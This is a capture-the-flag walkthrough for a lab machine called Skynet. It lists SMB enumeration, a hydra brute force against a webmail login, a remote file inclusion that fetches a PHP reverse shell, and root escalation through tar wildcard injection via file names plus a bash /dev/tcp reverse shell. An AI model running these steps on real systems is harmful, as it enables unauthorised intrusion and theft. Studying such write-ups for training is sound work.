# Skynet

- What is Miles password for his emails?

	- `scilla port -target <TARGET_IP>`
	- 6 ports open...
	- Looking the website...nice.
	- `nmap -p 139 -A <TARGET_IP>`
	- `enum4linux -h <TARGET_IP> -N`
	- We see share list, permissions and a user.
	- `smbclient //<TARGET_IP>/anonymous -p 139` with no password.
	- Get all the files with `get file` and then `exit`.
	- `hydra -l milesdyson -P log1.txt <TARGET_IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -v`
	- `************************`

- What is the hidden directory?

	- Enter in the Miles' mail.
	- You find in the first email the samba Password.
	- `smbclient -U milesdyson //<TARGET_IP>/milesdyson` and enter pwd.
	- `ls`
	- `cd notes`
	- `get important.txt`
	- `*******************`

- What is the vulnerability called when you can include a remote file for malicious purposes?

	- `remote file inclusion`

- What is the user flag?

	- `scilla dir -target <TARGET_IP>/***************`
	- we find a subdir called `administrator`
	- [RFI](https://www.exploit-db.com/exploits/25971)
	- `http://<TARGET_IP>/****************/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
	- On your machine `nc -lnvp 1234`
	- Download the pentestmonkey reverse shell and change the ip address.
	- On your machine `sudo python3 -m http.server`
	- `http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR_IP>:8000/php-reverse-shell.php`
	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	- `cd /home/milesdyson`
	- `cat user.txt`
	- `*************************`

- What is the root flag?

	- `cat /etc/crontab`
	- The file backup.sh is executed by root every minute
	- This will help us: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` (from GTFObins)
	- We create a file with the content:
	~~~
	#!/bin/bash
	bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
	~~~
	- And we save this into `/var/www/html/shell`
	- `chmod +x /var/www/html/shell`
	- `touch /var/www/html/--checkpoint=1`
	- `touch /var/www/html/--checkpoint-action=exec=bash\ shell`
	- On your machine `nc -lvnp 4444`
	- Wait some moments and you get a root shell.
	- `cat /root/root.txt`
	- `*******************************`


